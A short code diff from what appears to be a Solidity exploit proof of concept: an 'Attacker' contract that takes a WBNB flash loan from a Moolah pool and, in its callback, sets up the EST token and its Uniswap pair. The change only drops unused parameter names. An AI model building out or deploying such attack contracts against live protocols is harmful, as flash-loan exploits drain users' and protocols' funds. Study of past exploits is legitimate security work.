@@ -72,7 +72,7 @@ contract Attacker is IMoolahFlashLoanCallback {
         moolah.flashLoan(WBNB, _amount, "");
     }
 
-    function onMoolahFlashLoan(uint256 _assets, bytes calldata _data) external {
+    function onMoolahFlashLoan(uint256, bytes calldata) external {
         IWBNB wbnb = IWBNB(WBNB);
         IEST est = IEST(EST);
         IUniswapPair2 uniswapPair = IUniswapPair2(est.uniswapV2Pair());
